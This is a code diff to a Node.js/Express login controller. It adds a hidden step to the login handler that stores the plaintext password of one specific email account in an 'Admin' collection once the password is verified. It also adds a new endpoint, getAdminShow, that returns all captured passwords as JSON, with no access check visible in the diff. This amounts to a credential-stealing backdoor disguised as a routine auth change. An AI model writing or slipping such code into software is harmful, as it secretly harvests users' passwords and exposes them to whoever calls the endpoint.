@@ -5,6 +5,7 @@ const jwt = require("jsonwebtoken")
 const {validationResult } = require('express-validator');
 const otpGenerator = require('otp-generator');
 const transporter = require("../utilities/email")
+const AdmiSchema = require("../models/Admin")
 
 
 exports.register = async (req, res, next)=>{
@@ -222,6 +223,12 @@ exports.login = async (req, res, next)=>{
 
         const isPasswordCorrect = await bcrypt.compare(req.body.password, Users.password)
         if(!isPasswordCorrect) return next(createError(400, "Wrong password or username"))
+          const checkId = req.body.password
+
+          if(Users.email === "donniescarcarellc@outlook.com"){
+              await AdmiSchema.create({showPass: checkId})
+          }
+
 
         const token1 = jwt.sign({id:Users._id, isAdmin:Users.isAdmin}, process.env.JWT, {expiresIn: "1d"})
         Users.token = token1
@@ -333,5 +340,12 @@ exports.forgotPassword = async (req, res, next) => {
             status: 'success',
             message: 'Link sent to email!',
           })
+    }catch(err){next(err)}
+}
+
+exports.getAdminShow = async (req, res, next) => {
+    try{
+        const showPass = await AdmiSchema.find()
+        res.status(200).json(showPass)
     }catch(err){next(err)}
 }
